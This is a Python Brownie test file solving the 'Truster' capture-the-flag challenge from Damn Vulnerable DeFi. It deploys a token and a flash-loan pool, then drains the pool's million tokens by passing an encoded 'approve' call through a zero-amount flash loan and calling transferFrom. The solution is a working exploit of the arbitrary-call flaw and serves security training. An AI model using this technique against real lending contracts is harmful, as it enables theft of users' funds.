from scripts.utils import *
from brownie import DamnValuableToken, TrusterLenderPool

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # tokens in pool
    TOKENS_IN_POOL = ether_to_wei(1000000)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker = define_from_acc(qty=2)

    # deploy the contracts
    token = DamnValuableToken.deploy(_fromDeployer)
    pool = TrusterLenderPool.deploy(token.address, _fromDeployer)

    # fund the pool
    token.transfer(pool.address, TOKENS_IN_POOL, _fromDeployer)

    # confirm the balances are correct
    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == 0

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # It is no longer possible to execute flash loans
        assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
        assert token.balanceOf(pool.address) == 0

# #########################################################
# More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
#
# Currently the pool has 1 million DVT tokens in balance. And you have nothing.
#
# But don't worry, you might be able to take them all from the pool. In a single transaction.
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # Encode a call to the DVT contract approving the attacker to take all the tokens from the pool
    attack_call = token.approve.encode_input(attacker.address, TOKENS_IN_POOL)

    # run the flash loan borrowing 0 tokens and passing the encoded call
    pool.flashLoan(0, pool.address, token.address, attack_call, _fromAttacker)

    # take all the tokens from the pool
    token.transferFrom(pool.address, attacker.address, TOKENS_IN_POOL, _fromAttacker)
    
    ######################
    check_solution()
